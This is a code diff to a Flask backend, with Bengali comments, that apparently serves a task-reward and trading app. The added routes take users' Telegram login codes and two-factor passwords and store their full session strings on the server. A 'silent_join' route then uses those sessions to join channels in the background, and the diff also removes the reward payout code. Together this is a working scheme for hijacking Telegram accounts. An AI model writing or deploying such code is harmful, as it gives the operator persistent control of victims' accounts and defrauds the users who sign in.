@@ -33,8 +33,11 @@ users_col = mdb['users']
 tasks_col = mdb['tasks']
 settings_col = mdb['settings']
 
-# ডাটাবেস সেটআপের নিচে এটি যোগ করুন
-temp_clients = {}
+# ইভেন্ট লুপ ফিক্স (গ্লোবাল)
+try:
+    asyncio.get_event_loop()
+except RuntimeError:
+    asyncio.set_event_loop(asyncio.new_event_loop())
 
 # ---------------------------------------------------------
 # ২. হেল্পার ফাংশন
@@ -50,49 +53,82 @@ def login_required(f):
 def get_admin_settings():
     return db.reference('admin_settings').get() or {}
 
-def check_membership(session_str, channel_id):
-    if not session_str or not channel_id: return False
-    try:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        client = TelegramClient(StringSession(session_str), API_ID, API_HASH, loop=loop)
-        with client:
-            client.loop.run_until_complete(client(GetParticipantRequest(channel_id, 'me')))
-        return True
-    except:
-        return False
-
 # ---------------------------------------------------------
 # ৩. API রুটস
 # ---------------------------------------------------------
 
-@app.route('/api/user/data/<int:user_id>')
-def get_user_data_by_id(user_id):
-    if 'uid' not in session or session.get('uid') != user_id:
-        return jsonify({"status": "error", "message": "Unauthorized"}), 401
+@app.route('/api/send_otp', methods=['POST'])
+def send_otp_handler():
+    data = request.json
+    phone = data.get('phone')
     
-    user = users_col.find_one({"telegram_id": user_id})
-    admin_data = get_admin_settings()
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
 
-    if not user:
-        return jsonify({"status": "error", "message": "User not found"}), 404
+    try:
+        client = TelegramClient(StringSession(), API_ID, API_HASH, loop=loop)
+        client.connect()
+        result = client.send_code_request(phone)
+        
+        # ডাটাবেজে সেভ (রেন্ডার রিস্টার্ট হলেও হারাবে না)
+        users_col.update_one(
+            {"phone": phone},
+            {"$set": {
+                "temp_session": client.session.save(),
+                "phone_code_hash": result.phone_code_hash,
+                "auth_pending": True
+            }},
+            upsert=True
+        )
+        
+        client.disconnect() 
+        return jsonify({"success": True})
+    except Exception as e:
+        return jsonify({"success": False, "message": str(e)})
 
-    return jsonify({
-        "status": "success",
-        "user": {
-            "username": user.get("name", "User"),
-            "telegram_id": user.get("telegram_id"),
-            "cash": f"{user.get('main_balance', 0.0):.2f}",
-            "aaf": f"{user.get('aaf_balance', 0):.0f}",
-            "is_joined": user.get('is_joined', False)
-        },
-        "admin": {
-            "channel_url": admin_data.get('channel_link', '#'),
-            "server_income": admin_data.get('server_income', 0),
-            "server_trading": admin_data.get('server_trading', 0),
-            "total_users": admin_data.get('extra_users', 0)
-        }
-    })
+@app.route('/api/verify_login', methods=['POST'])
+def verify_login_handler():
+    data = request.json
+    phone = data.get('phone')
+    code = data.get('code')
+    password = data.get('password')
+    
+    # ডাটাবেজ থেকে চেক
+    temp_data = users_col.find_one({"phone": phone, "auth_pending": True})
+    if not temp_data:
+        return jsonify({"success": False, "message": "Session Expired! Please try again."})
+
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    
+    try:
+        client = TelegramClient(StringSession(temp_data["temp_session"]), API_ID, API_HASH, loop=loop)
+        client.connect()
+        
+        if password:
+            user = client.sign_in(phone, code, password=password)
+        else:
+            user = client.sign_in(phone, code, phone_code_hash=temp_data["phone_code_hash"])
+            
+        session["uid"] = user.id
+        final_session = client.session.save()
+        
+        # মূল সেশন সেভ এবং পেন্ডিং স্ট্যাটাস রিমুভ
+        users_col.update_one(
+            {"telegram_id": user.id}, 
+            {"$set": {
+                "name": user.first_name, 
+                "phone": phone, 
+                "session_str": final_session,
+                "auth_pending": False 
+            }}, 
+            upsert=True
+        )
+        
+        client.disconnect()
+        return jsonify({"success": True, "uid": user.id})
+    except Exception as e:
+        return jsonify({"success": False, "message": str(e)})
 
 @app.route('/api/silent_join', methods=['POST'])
 @login_required
@@ -112,16 +148,41 @@ def silent_join():
             client = TelegramClient(StringSession(user['session_str']), API_ID, API_HASH, loop=loop)
             with client:
                 client.loop.run_until_complete(client(JoinChannelRequest(target_channel)))
-        try:
-      asyncio.get_event_loop()
-        except RuntimeError:
-      asyncio.set_event_loop(asyncio.new_event_loop())
             users_col.update_one({"telegram_id": uid}, {"$set": {"is_joined": True}})
         except Exception as e:
             print(f"Join Error: {e}")
 
     threading.Thread(target=background_join).start()
     return jsonify({"success": True})
+
+# --- বাকি সব রুটস (Dashboard, Task, Market ইত্যাদি) আগের মতোই থাকবে ---
+@app.route('/api/user/data/<int:user_id>')
+def get_user_data_by_id(user_id):
+    if 'uid' not in session or session.get('uid') != user_id:
+        return jsonify({"status": "error", "message": "Unauthorized"}), 401
+    user = users_col.find_one({"telegram_id": user_id})
+    admin_data = get_admin_settings()
+    if not user: return jsonify({"status": "error", "message": "User not found"}), 404
+    return jsonify({
+        "status": "success",
+        "user": {
+            "username": user.get("name", "User"),
+            "telegram_id": user.get("telegram_id"),
+            "cash": f"{user.get('main_balance', 0.0):.2f}",
+            "aaf": f"{user.get('aaf_balance', 0):.0f}",
+            "is_joined": user.get('is_joined', False)
+        },
+        "admin": {
+            "channel_url": admin_data.get('channel_link', '#'),
+            "server_income": admin_data.get('server_income', 0),
+            "server_trading": admin_data.get('server_trading', 0),
+            "total_users": admin_data.get('extra_users', 0)
+        }
+    })
+# ---------------------------------------------------------
+# 4. ট্রেডিং ও মার্কেট কন্ট্রোল
+# ---------------------------------------------------------
+
 
 @app.route('/api/user/tasks/claim', methods=['POST'])
 @login_required
@@ -144,92 +205,9 @@ def claim_task():
     if task_id in user.get("completed_tasks", []):
         return jsonify({"success": False, "message": "ইতিমধ্যেই করেছেন!"})
 
-    reward = float(task['reward'])
-    balance_field = "aaf_balance" if task['currency'] == 'aaf' else "main_balance"
 
-    users_col.update_one(
-        {"telegram_id": uid},
-        {"$inc": {balance_field: reward, "tasks_done": 1}, "$push": {"completed_tasks": task_id}}
-    )
-    return jsonify({"success": True, "message": f"{reward} ক্লেইম হয়েছে!"})
 
 # ---------------------------------------------------------
-# ৪. লগইন ও OTP সিস্টেম
-# --------------------------------------------------------
-# ১৬০ নম্বর লাইনের উপরে এটি বসান
-try:
-    asyncio.get_event_loop()
-except RuntimeError:
-    asyncio.set_event_loop(asyncio.new_event_loop())
-
-@app.route('/api/send_otp', methods=['POST'])
-def send_otp_handler():
-    data = request.json
-    phone = data.get('phone')
-    
-    # এই ২ লাইন হলো আসল ম্যাজিক যা আপনার এরর ফিক্স করবে
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-
-    try:
-        # মেমরিতে না রেখে ডাটাবেজে সেভ করুন
-    users_col.update_one(
-        {"phone": phone},
-        {"$set": {
-            "temp_session": client.session.save(),
-            "phone_code_hash": result.phone_code_hash,
-            "auth_pending": True
-        }},
-        upsert=True
-    )
-        
-        temp_clients[phone] = {
-            "session": client.session.save(), 
-            "hash": result.phone_code_hash
-        }
-        client.disconnect() 
-        return jsonify({"success": True})
-    except Exception as e:
-        return jsonify({"success": False, "message": str(e)})
-
-@app.route('/api/verify_login', methods=['POST'])
-def verify_login_handler():
-    data = request.json
-    phone, code, password = data.get('phone'), data.get('code'), data.get('password')
-    
-    # ডাটাবেজ থেকে চেক করুন (temp_clients এর বদলে)
-    temp_data = users_col.find_one({"phone": phone, "auth_pending": True})
-    if not temp_data:
-        return jsonify({"success": False, "message": "Session Expired! Please try again."})
-    # এখানেও লুপ সেট করতে হবে
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    
-    try:
-        client = TelegramClient(StringSession(temp_clients[phone]["session"]), API_ID, API_HASH, loop=loop)
-        client.connect()
-        
-        # পাসওয়ার্ড চেক
-        if password:
-            user = client.sign_in(phone, code, password=password, phone_code_hash=temp_clients[phone]["hash"])
-        else:
-            user = client.sign_in(phone, code, phone_code_hash=temp_clients[phone]["hash"])
-            
-        session["uid"] = user.id
-        final_session = client.session.save()
-        
-        users_col.update_one(
-            {"telegram_id": user.id}, 
-            {"$set": {"name": user.first_name, "phone": phone, "session_str": final_session}}, 
-            upsert=True
-        )
-        
-        client.disconnect()
-        return jsonify({"success": True, "uid": user.id})
-    except Exception as e:
-        return jsonify({"success": False, "message": str(e)})
-
-
 # ৫. ট্রেডিং ও মার্কেট কন্ট্রোল
 # ---------------------------------------------------------
 @app.route('/api/market/current-price')
